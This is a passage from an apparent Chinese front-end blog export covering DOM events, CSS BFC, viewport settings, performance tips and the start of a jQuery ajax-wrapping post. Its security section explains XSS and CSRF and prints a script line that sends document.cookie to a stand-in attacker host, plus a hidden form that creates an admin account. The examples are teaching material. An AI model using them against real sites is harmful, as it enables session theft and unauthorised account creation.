class=\"string\">\"fun()\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>通过JS代码指定属性值:</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> btn = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'.btn'</span>);</span><br><span class=\"line\">btn.onclick = fun;</span><br><span class=\"line\"><span class=\"comment\">//移除监听函数：</span></span><br><span class=\"line\"></span><br><span class=\"line\">btn.onclick = <span class=\"literal\">null</span>;</span><br></pre></td></tr></table></figure>\n<h3>DOM2级模型</h3>\n<p>属于W3C标准模型，现代浏览器(除IE6-8之外的浏览器)都支持该模型。在该事件模型中，一次事件共有三个过程:</p>\n<ul>\n<li>事件捕获阶段(capturing phase)。事件从document一直向下传播到目标元素, 依次检查经过的节点是否绑定了事件监听函数，如果有则执行。</li>\n<li>事件处理阶段(target phase)。事件到达目标元素, 触发目标元素的监听函数。</li>\n<li>事件冒泡阶段(bubbling phase)。事件从目标元素冒泡到document, 依次检查经过的节点是否绑定了事件监听函数，如果有则执行。</li>\n</ul>\n<p>事件绑定监听函数的方式如下:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">addEventListener(eventType, handler, useCapture)</span><br></pre></td></tr></table></figure>\n<p>事件移除监听函数的方式如下:</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">removeEventListener(eventType, handler, useCapture)</span><br></pre></td></tr></table></figure>\n<p>参数说明:</p>\n<ul>\n<li>eventType指定事件类型(不要加on)</li>\n<li>handler是事件处理函数</li>\n<li>useCapture是一个boolean用于指定是否在捕获阶段进行处理，一般设置为false与IE浏览器保持一致。</li>\n</ul>\n<h1>css篇</h1>\n<h2>overflow:hidden清除浮动原理</h2>\n<ul>\n<li>BFC （Block Formatting Context）全称是块级格式化上下文，用于对块级元素排版，默认情况下只有根元素（body)一个块级上下文，但是如果一个块级元素 设置了float:left，overflow:hidden或position:absolute样式，就会为这个块级元素生成一个独立的块圾上下文，就像在window全局作用域内，声明了一个function就会生成 一个独立的作用域一样，新开僻的BFC像是开僻了一个新的小宇宙，使这个块圾元素内部的排版完全独立隔绝。</li>\n<li>独立的块级上下文可以包裹浮动流，全部浮动子元素也不会引起容器高度塌陷，也就是说包含块会把浮动元素的高度也计算在内，所以不用清除浮动来撑起高度。</li>\n</ul>\n<p>如何触发BFC</p>\n<ol>\n<li>根元素</li>\n<li>float的值不为none</li>\n<li>overflow的值不为visible</li>\n<li>display的值为inline-block、table-cell、table-caption</li>\n<li>position的值为absolute或fixed</li>\n<li>display：table也认为可以生成BFC，其实这里的主要原因在于Table会默认生成一个匿名的table-cell，正是这个匿名的table-ccell生成了BFC</li>\n</ol>\n<p>BFC的应用</p>\n<ol>\n<li>解决margin重叠问题</li>\n</ol>\n<p>相邻的垂直元素同时设置了margin后，实际margin值会塌陷到其中较大的那个值。其根本原理就是它们处于同一个BFC，符合“属于同一个BFC的两个相邻元素的margin会发生重叠”的规则。</p>\n<ol start=\"2\">\n<li>解决浮动问题</li>\n</ol>\n<p>当在父元素中设置overflow:hidden时就会触发BFC，所以他内部的元素就不会影响外面的布局，BFC就把浮动的子元素高度当做了自己内部的高度去处理溢出，所以外面看起来是清除了浮动</p>\n<ol start=\"3\">\n<li>解决侵占浮动元素的问题</li>\n</ol>\n<p>当一个元素浮动，另一个元素不浮动时，浮动元素因为脱离文档流就会盖在不浮动的元素上。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box1</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: pink;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.box2</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: skyblue;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"640.webp\" alt=\"pic\"><br>\n我们做如下修改：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box2</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: skyblue;</span><br><span class=\"line\">  <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/* 或者是 */</span></span><br><span class=\"line\"><span class=\"selector-class\">.box2</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">height</span>: <span class=\"number\">200px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: skyblue;</span><br><span class=\"line\">  <span class=\"comment\">/* overflow: hidden; */</span></span><br><span class=\"line\">  <span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"641.webp\" alt=\"pic\"><br>\n我们为非浮动元素建立BFC环境，根据BFC的不与float box重叠的规则，解决了侵占元素问题。</p>\n<p>这一特性，我认为还是很有用的，特别是应用在两栏布局上，对比我们常规为非浮动元素或非定位元素设置margin来挤开的方法，其优点在于不需要去知道浮动或定位元素的宽度。</p>\n<h2>inline-block和float的共性和区别</h2>\n<p><strong>共性</strong>：</p>\n<ul>\n<li>inline-block: 是把一个元素的display设置为块状内联元素，意思就是说，让一个元素的容器inline展示，并且里面的内容block展示；inline属性使元素内联展示，内联元素设置宽度无效，相邻的inline元素会在一行显示不换行，直到本行排满为止。block的元素始终会独占一行，呈块状显示，可设置宽高。所以inline-block的元素就是宽高可设置，相邻的元素会在一行显示，直到本行排满，也就是让元素的容器属性为block，内容为inline。</li>\n<li>float： 设置元素的浮动为左或者右浮动，当设置元素浮动时，相邻元素会根据自身大小，排满一行，如果父容器宽度不够则会换行。当我们设置了元素的浮动时，这个元素就脱离了文档流，相邻元素会呈环绕装排列。</li>\n</ul>\n<p>两者共同点是都可以实现元素在一行显示，并且可以自由设置元素大小。</p>\n<p><strong>区别</strong>：</p>\n<ul>\n<li>inline-block: 水平排列一行，即使元素高度不一，也会以高度最大的元素高度为行高，即使高度小的元素周围留空，也不回有第二行元素上浮补位。可以设置默认的垂直对齐基线。</li>\n<li>float: 让元素脱离当前文档流，呈环绕装排列，如遇上行有空白，而当前元素大小可以挤进去，这个元素会在上行补位排列。默认是顶部对齐。</li>\n</ul>\n<h1>html篇</h1>\n<h2>meta标签中的Viewport</h2>\n<h3>Viewport 有几个属性</h3>\n<ul>\n<li>width：控制 viewport 的大小，你可以给它指定一个值，如：600，或者甚至还可以给它一个特殊的值，如：device-width，device-width为设备的宽度（单位为缩放为 100% 时的 CSS 的像素）。</li>\n<li>height：与 width 相对应，指定viewport 高度。</li>\n<li>initial-scale：初始缩放比例，也即是当页面第一次 load 的时候缩放比例。</li>\n<li>maximum-scale：允许用户缩放到的最大比例。</li>\n<li>minimum-scale：允许用户缩放到的最小比例。</li>\n<li>user-scalable：是否允许用户手动缩放。</li>\n</ul>\n<h3>Viewport囊括了三个视窗</h3>\n<h4>视觉视窗</h4>\n<p>就是指代整个屏幕的可视区域，当然不包括浏览器的导航位置<br>\n<img src=\"meta-viewport-usage-1.jpg\" alt=\"实例\"></p>\n<h4>布局视窗</h4>\n<p>布局视窗跟视觉视窗不一样，它不是指设备屏幕区域，它是为了解决PC 端网站在移动端显示不佳的一个解决方案<br>\n<img src=\"meta-viewport-usage-2.jpg\" alt=\"实例\"></p>\n<h4>理想视窗</h4>\n<p>这个理想视窗是为了布局视窗而生的，为什么这么说，因为它是基于布局视窗的。他其实就是变了尺寸的布局视窗。理想视窗就是把布局视窗调整到合适的状态，让页面有最好的表面效果，这也是它名字的由来。设置了理想视窗用户就不再需要对页面进行缩放，因为浏览器已经帮你把页面调整到最佳的显示状态了。而你要做的就是告诉浏览器，你要他这么做就OK了。就下面这一段代码就可以让浏览器乖乖地把布局视窗调整到最理想的状态</p>\n<h1>优化篇</h1>\n<h2>网络加载类</h2>\n<h3>域名收敛</h3>\n<p>对于PC 上的DNS 通常情况下就是几十ms. 因为PC可以存储很多的域名地址,而且TTL长着呢. 但是，对于手机端来说, 由于我们良心的3G和4G网络运营商节省开支的缘由, 一般在手机端上解析DNS 会到1s+. 所以，这样算下来， 首屏3s的最佳时间，你就已经没了1/3, 那还玩个屁. 不过，我们可以用很多预加载技术，比如localstorage,session,manifest等预先存储资源. 在PC上极度推崇domian sharding时, 在手机端上，此法不见得能行得通了.<br>\n所以, 一般来说，在手机端上的域名数不能超过5个。 基本上的分配就是<br>\nhtml +1<br>\ncss +1<br>\nimg +1<br>\njs +1<br>\nfonts +1<br>\n当然，这得看具体应用场景了.</p>\n<h3>避免页面中空的 href 和 src</h3>\n<p>当 link标签的 href 属性为空，或script、img、iframe标签的 src 属性为空时，浏览器在渲染的过程中仍会将 href 属性或 src 属性中的空内容进行加载，直到加载失败，这样就阻塞了页面中其他资源的下载进程，而且最终加载到的内容是无效的，因此要尽量避免。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- 不推荐 --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"photo\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3>合理设置 Etag 和 Last-Modified</h3>\n<p>合理设置 Etag 和 Last-Modified 使用浏览器缓存，对于未修改的文件，静态资源服务器会向浏览器端返回 304 ，让浏览器从缓存中读取文件，减少 Web 资源下载的带宽消耗并降低服务器负载。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"Last-Modified\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"Mon, 03 Oct 2017 17:45:57 GMT\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<h3>减少页面重定向</h3>\n<p>页面每次重定向都会延长页面内容返回的等待延时，一次重定向大约需要 600 毫秒的时间开销，为了保证用户尽快看到页面的内容，要尽量避免页面重定向。</p>\n<h3>使用静态资源分域存放来增加下载并行数</h3>\n<p>浏览器在同一时刻向同一个域名请求文件的并行下载数是有限的，因此可以利用多个域名的主机来存放不同的静态资源，增大页面加载时资源的并行下载数，缩短页面资源加载的时间。通常根据多个域名来分别存储 JavaScript、CSS 和图片文件。</p>\n<p><strong>但是这个策略需要慎用，因为过多的域名会造成DNS解析开销</strong></p>\n<h3>CDN</h3>\n<h4>使用静态资源 CDN 来存储文件</h4>\n<p>如果条件允许，可以利用 CDN 网络加快同一个地理区域内重复静态资源文件的响应下载速度，缩短资源请求时间。</p>\n<h4>使用 CDN Combo 下载传输内容</h4>\n<p>CDN Combo 是在 CDN 服务器端将多个文件请求打包成一个文件的形式来返回的技术，这样可以实现 HTTP 连接传输的一次复用，减少浏览器的 HTTP 请求数，加快资源下载速度。例如同一个域名 CDN 服务器上的 a.js，b.js，c.js 就可以按如下方式在一个请求中下载。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//cdn.domain.com/path/a.js,b.js,c.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>这种方式我在微信公众号后台看到过</strong></p>\n<h3>使用 GET 来完成 AJAX 请求</h3>\n<p>使用 XMLHttpRequest 时，浏览器中的 POST 方法发送请求首先发送文件头，然后发送 HTTP 正文数据。而使用 GET 时只发送头部，所以在拉取服务端数据时使用 GET 请求效率更高。</p>\n<h3>减少 Cookie 的大小并进行 Cookie 隔离</h3>\n<p>HTTP 请求通常默认带上浏览器端的 Cookie 一起发送给服务器，所以在非必要的情况下，要尽量减少 Cookie 来减小 HTTP 请求的大小。对于静态资源，尽量使用不同的域名来存放，因为 Cookie 默认是不能跨域的，这样就做到了不同域名下静态资源请求的 Cookie 隔离。</p>\n<h3>使用异步 JavaScript 资源</h3>\n<p>异步的 JavaScript 资源不会阻塞文档解析，所以允许在浏览器中优先渲染页面，延后加载脚本执行。例如 JavaScript 的引用可以如下设置，也可以使用模块化加载机制来实现。比如 requireJS、Seajs等</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用defer时，加载后续文档元素的过程和main.js的加载是并行的，但main.js的执行要在页面所有元素解析完成之后才开始执行</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/main.js\"</span> <span class=\"attr\">defer</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span> </span><br><span class=\"line\">//使用async时，加载后续文档元素的过程和main.js的加载是并行的</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"/main.js\"</span> <span class=\"attr\">async</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3>使用base64编码</h3>\n<p>小文件应转换成base64编码，如小图，字体文件，音频等，尽量减少http请求</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.class-name</span> &#123;</span><br><span class=\"line\">   <span class=\"attribute\">background-image </span>: <span class=\"built_in\">url</span>(<span class=\"string\">'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAALCAMAAABxsOwqAAAAYFBMVEWnxwusyQukxQudwQyZvgyhxAyfwgyxzAsUHQGOuA0aJAERGAFIXwSTugyEqgtqhghQZgUwQQIpOQKbuguVtQuKrAuCowp2kQlheghTbQZHWQU7SwVAVgQ6TgQlLwMeKwFOemyQAAAAVElEQVQI1y3JVRaAIAAF0UconXbvf5ei8HfPDIQQhBAAFE10iKig3SLRNN4SP/p+N08VC0YnfIlNWtqIkhg/TPYbCvhqdHAWRXPZSp3g3CWZvVLXC6OJA3ukv0AaAAAAAElFTkSuQmCC'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3>图片/视频懒加载</h3>\n<p>为了保证页面内容的最小化，加速页面的渲染，尽可能节省移动端网络流量，页面中的图片资源推荐使用懒加载实现，在页面滚动时动态载入图片。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">data-src</span>=<span class=\"string\">\"https://user-gold-cdn.xitu.io/2017/12/29/160a1604f3efd980\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"懒加载图片\"</span> &gt;</span></span><br></pre></td></tr></table></figure>\n<h3>使用 iconfont 代替图片图标</h3>\n<p>在页面中尽可能使用 iconfont 来代替图片图标，这样做的好处有以下几个：</p>\n<ul>\n<li>使用 iconfont 体积较小，而且是矢量图，因此缩放时不会失真；</li>\n<li>可以方便地修改图片大小尺寸和呈现颜色。</li>\n</ul>\n<h2>页面渲染类</h2>\n<h3>把 CSS 资源引用放到 HTML 文件顶部</h3>\n<p>一般推荐将所有 CSS 资源尽早指定在 HTML 文档 <head> 中，这样浏览器可以优先加载 CSS 并尽早完成页面渲染。</head></p>\n<h3>JavaScript 资源引用放到 HTML 文件底部</h3>\n<p>JavaScript 资源放到 HTML 文档底部可以防止 JavaScript 的加载和解析执行对页面渲染造成阻塞。由于 JavaScript 资源默认是解析阻塞的，除非被标记为异步或者通过其他的异步方式加载，否则会阻塞 HTML DOM 解析和 CSS 渲染的过程。</p>\n<h3>不要在 HTML 中直接缩放图片</h3>\n<p>在 HTML 中直接缩放图片会导致页面内容的重排重绘，此时可能会使页面中的其他操作产生卡顿，因此要尽量减少在页面中直接进行图片缩放。</p>\n<h3>减少 DOM 元素数量和深度</h3>\n<p>HTML 中标签元素越多，标签的层级越深，浏览器解析 ** DOM** 并绘制到浏览器中所花的时间就越长，所以应尽可能保持 DOM 元素简洁和层级较少。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--不推荐--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"javascript: void(0);\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./path/photo.jpg\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"图片\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!--推荐--&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./path/photo.jpg\"</span> <span class=\"attr\">alt</span>=<span class=\"string\">\"图片\"</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3>尽量避免使用 table、iframe等慢元素</h3>\n<p>table内容的渲染是将 table 的 DOM 渲染树全部生成完并一次性绘制到页面上的，所以在长表格渲染时很耗性能，应该尽量避免使用它，可以考虑使用列表元素 ul 代替。尽量使用异步的方式动态添加 iframe 内资源的下载进程会阻塞父页面静态资源的下载与 CSS 及 HTML DOM的解析。</p>\n<h3>避免运行耗时的 Javascript</h3>\n<p>长时间运行的 JavaScript 会阻塞浏览器构建 DOM 树、DOM 渲染树、渲染页面。所以，任何与页面初次渲染无关的逻辑功能都应该延迟加载执行，这和 JavaScript 资源的异步加载思路是一致的。</p>\n<h3>避免使用 CSS 表达式或 CSS 滤镜</h3>\n<p>CSS 表达式或 CSS 滤镜的解析渲染速度是比较慢的，在有其他解决方案的情况下应该尽量避免使用。</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* 不推荐 */</span></span><br><span class=\"line\"><span class=\"selector-class\">.opacity</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">filter</span>:progid:DXImageTransform.Microsoft.<span class=\"built_in\">Alpha</span>(opacity=50);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h1>安全</h1>\n<h2>xss和csrf的原理以及怎么预防</h2>\n<h3>XSS</h3>\n<p>用户浏览网页时发送错误，向服务器请求 URL，<a href=\"http://xn--www-eo8er22f.xxx.com/error.php?message=sorry,an\" target=\"_blank\" rel=\"noopener\">比如www.xxx.com/error.php?message=sorry,an</a> error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板中：<code>&lt;p&gt;sorry,an error occurred&lt;/p&gt;</code>，返回给用户。</p>\n<p>这个漏洞有一个显著的特征，应用程序没有进行任何过滤或净化措施，就非常容易受到攻击。<code>www.xxx.com/error.php?message=&lt;script&gt;alert(1)&lt;/script&gt;</code>，当用户打开错误页面时，就会出现<code>&lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;</code>，弹出一个消息框。</p>\n<p>显然，攻击人员不会很傻的仅仅 alert 一些消息，在 IE 中，如果开启跨站点脚本检测可能无法弹出消息。通常 XSS 都会伴随着会话劫持，攻击者截获通过验证的用户的会话令牌。劫持用户的会话后，攻击者就可以访问该用户授权访问的所有数据和功能。<br>\n比如攻击者构造一个这样的 URL，message 信息如下</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> i = <span class=\"keyword\">new</span> Image;</span><br><span class=\"line\">i.src=<span class=\"string\">\"http://attacker.net/\"</span>+<span class=\"built_in\">document</span>.cookie;</span><br></pre></td></tr></table></figure>\n<p>这样被攻击者通过访问这个恶意的 URL，就会把 cookie 发送给黑客，黑客截获 cookie，就能执行用户的任意操纵。</p>\n<h3>OSRF</h3>\n<p>跨站点请求伪造才是跨站伪造的重点内容，攻击者只需要创建一个看似无害的网站，致使受害者的浏览器直接向易受攻击的服务器提交一个请求，执行恶意代码。<br>\n仍然需要考虑同源策略，以管理员创建新用户为例，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /newUser.php HTTP/1.1</span><br><span class=\"line\">Host: xxx.com</span><br><span class=\"line\">Cookie: SessionId=...</span><br><span class=\"line\">Content-Length: ..</span><br><span class=\"line\"></span><br><span class=\"line\">name=ro&amp;userrole=admin&amp;password=123456&amp;confirmpassword=123456</span><br></pre></td></tr></table></figure>\n<p>黑客构造的网站会提交一个 form 表单，并想办法让 form 隐藏：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">\"http://xxx.com/newUser.php\"</span> <span class=\"attr\">method</span>=<span class=\"string\">\"POST\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"name\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"ro\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"userrole\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"admin\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"password\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"123456\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"hidden\"</span> <span class=\"attr\">name</span>=<span class=\"string\">\"confirmpassword\"</span> <span class=\"attr\">value</span>=<span class=\"string\">\"123456\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>当管理员已经登陆的情况下，访问这个恶意网站的时候，就会提交这段脚本，管理员都不知情。因为管理员已经登陆，无需考虑 Cookie 的问题，一个简单的 CSRF 如此。<br>\n<strong>应对办法</strong></p>\n<ol>\n<li>对一些关键字和特殊字符进行过滤或 URL、HTML 编码，&quot;&lt;&gt;?“或&quot;script，javascript”；</li>\n<li>Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；</li>\n<li>验证HTTP Referer</li>\n<li>在请求中添加 token 并验证</li>\n</ol>\n"},{"title":"jQuery的ajax方法拦截器","catalog":true,"date":"2017-06-19T14:40:34.000Z","subtitle":null,"header-img":"post/IMG_2440.JPG","keyword":"jquery,ajax,拦截","_content":"之前因为一些原因，担任过一段时间公司的前端开发面试官，面试了很多人，问过这样两个问题：\n> 如何侵入一个方法实现代理（或者叫钩子）？// 2017年10月15日修正，这里应该叫装饰器或者装饰者\n\n> 在不修改页面业务代码只修改一处代码的情况下，如何统一处理jQuery的ajax的response数据？\n\n其实上面两个问题本质是差不多的，不过不知道是表述不清楚，还是web前端这一块的人水平确实参差不齐，尽然没有一个让我觉得满意的答案，网上其实也有答案，不过很多都不严谨，导致ajax的默认行为遭到破坏，例如：\n```javascript\nvar ajaxBackup = $.ajax;\n$.ajax = function( opts ) {\n  // do sth.\n  ajaxBackup( opts );\n}\n```\n上面的方法在大多数情况下可以使用，但是这样写的人肯定不知道ajax方法可以有两个参数`$.ajax( url, options )`，这就到导致了这种写法传入的`options`丢失了。。。 还有一个更严重的问题是，`$.ajax`方法返回的是一个类Promise对象，上面的写法直接导致了返回值为undefined。\n所以我认为应该这样写才能保证ajax方法的默认行为得到保护：\n```javascript\nvar ajaxBackup = $.ajax;\n\n$.ajax = function( url, options ) {\n\n  if ( typeof url === \"object\" ) {\n    options = url;\n    url = undefined;\n  }\n\n  options = options || {};\n\n  var completeBackUp = options.complete,\n    successBackup = options.success,\n    errorBackup = options.error;\n  var urlBackup = url;\n  var optionBackup = $.extend( {}, options );\n\n  options.complete = function() {\n    // to do sth. after request is complete.\n\n    if ( $.isFunction( completeBackUp ) ) {\n      completeBackUp.apply( options.context, arguments );\n    }\n  }\n  options.success = function( data ) {\n    // to do sth. after request is successful.\n    // 这里相当于做了代理，请求成功回调执行前要做的事\n\n    // 这里则是对传入的success回调进行相应\n    if ( $.isFunction( successBackup ) ) {\n      successBackup.apply( options.context, arguments );\n    }\n  }\n  options.error = function() {\n    if ( $.isFunction( errorBackup ) ) {\n      errorBackup.apply( options.context, arguments );\n    }\n  }\n\n  // 返回原先的ajax执行结果，不影响.done 